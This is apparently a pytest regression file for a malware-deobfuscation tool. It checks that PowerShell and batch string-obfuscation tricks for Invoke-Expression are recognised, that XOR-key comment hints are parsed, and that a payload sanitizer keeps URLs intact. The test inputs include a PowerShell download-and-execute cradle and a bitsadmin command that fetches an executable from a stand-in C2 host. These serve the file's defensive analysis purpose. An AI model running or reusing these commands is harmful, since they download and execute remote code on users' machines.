"""Feb-2026 v2 archetype regression — PowerShell string-obfuscation family.

Locks in the six new archetypes shipped with corpus v2:
  • PS_STRING_CONCAT        — `'Inv'+'oke'+'-Ex'+'pression'`
  • PS_JOIN_CHAR_ARRAY      — `('I','E','X') -join ''`  /  `[char[]](73,69,88)`
  • PS_FORMAT_OPERATOR      — `"{1}{0}" -f 'X','IE'`
  • PS_REVERSE_STRING       — `-join ('noisserpxE-ekovnI'[-1..-17])`
  • BATCH_VAR_SLICE         — `@set v=… %v:~x,y%`

Also verifies the analyst-provided `# xor-key 0xNN` comment parser and the
sanitizer URL guard — both prerequisites for a clean corpus v2 sweep.
"""
from __future__ import annotations
import os
import sys

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
import operations, ops_extended  # noqa: F401

from wrapper_archetypes import try_archetypes
from payload_sanitizer import find_xor_key, sanitize_encapsulated_payload


class TestPsStringObfuscationArchetypes:

    def test_string_concat_recovers_invoke_expression(self):
        inp = (
            "$c=('Inv'+'oke'+'-Ex'+'pression'); "
            "& $c ((New-Object Net.WebClient).DownloadString('http://x/y'))"
        )
        r = try_archetypes(inp)
        assert r is not None and "Invoke-Expression" in r["output"]
        assert "PS_STRING_CONCAT" in (r.get("chain_ids") or [])

    def test_char_string_array_recovers_iex(self):
        r = try_archetypes("(('I','E','X') -join '')")
        assert r and "IEX" in r["output"]

    def test_char_int_array_recovers_iex(self):
        r = try_archetypes("$a=[char[]](73,69,88); $a -join ''")
        assert r and "IEX" in r["output"]

    def test_format_op_recovers_iex(self):
        r = try_archetypes("\"{1}{0}\" -f 'EX','I'")
        assert r and "IEX" in r["output"]

    def test_reverse_string_recovers_invoke_expression(self):
        r = try_archetypes("-join ('noisserpxE-ekovnI'[-1..-17])")
        assert r and "Invoke-Expression" in r["output"]

    def test_batch_var_slice_recovers_secret(self):
        inp = "@set v=REALLYLONG_SECRET_VALUE\r\n@call echo %v:~11,6%"
        r = try_archetypes(inp)
        assert r and "SECRET" in r["output"]

    def test_no_false_positive_on_clean_ps(self):
        inp = "Write-Host 'hello world'"
        r = try_archetypes(inp)
        # None of the string-obfuscation archetypes should match a clean call.
        if r:
            ids = r.get("chain_ids") or []
            for bad in (
                "PS_STRING_CONCAT",
                "PS_JOIN_CHAR_ARRAY",
                "PS_FORMAT_OPERATOR",
                "PS_REVERSE_STRING",
                "BATCH_VAR_SLICE",
            ):
                assert bad not in ids, f"{bad} fired on benign input"


class TestXorKeyFromCommentHints:

    def test_hex_hint_recovered(self):
        assert find_xor_key("$b='ABCDEFGH'; # xor-key 0x2A") == 0x2A

    def test_decimal_hint_recovered(self):
        assert find_xor_key("$b='ABCDEFGH'; # xor-key 42") == 42

    def test_no_hint_returns_none(self):
        assert find_xor_key("$b='ABCDEFGH'") is None


class TestSanitizerUrlGuard:

    def test_url_present_disables_isolation(self):
        # AAA…AAA base64 blob PLUS a real URL — sanitizer must NOT isolate the
        # AAA span (that was the aes_cbc_analyst failure mode).
        inp = (
            "# key(b64): AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=\n"
            "# plaintext: 'http://real-url.example.test/x'"
        )
        assert sanitize_encapsulated_payload(inp) is None

    def test_bitsadmin_url_preserved(self):
        # bitsadmin /transfer command with URL — must NOT collapse to
        # `bitsadmintransferj1prioritynormalhttp`.
        inp = (
            "bitsadmin /transfer job1 /priority normal "
            "http://real-c2.example.test/j1.exe %TEMP%\\payload.exe"
        )
        assert sanitize_encapsulated_payload(inp) is None

    def test_pure_b64_still_isolated(self):
        # Regression: sanitizer still isolates a blob wrapped in analyst text
        # when NO URL is present.
        inp = (
            "$b='SGVsbG9Xb3JsZFRoaXNJc0FCYXNlNjRQYXlsb2FkVGhhdEZpdHNJbnNpZGVUaGVXcmFwcGVy'"
        )
        out = sanitize_encapsulated_payload(inp)
        assert out is not None
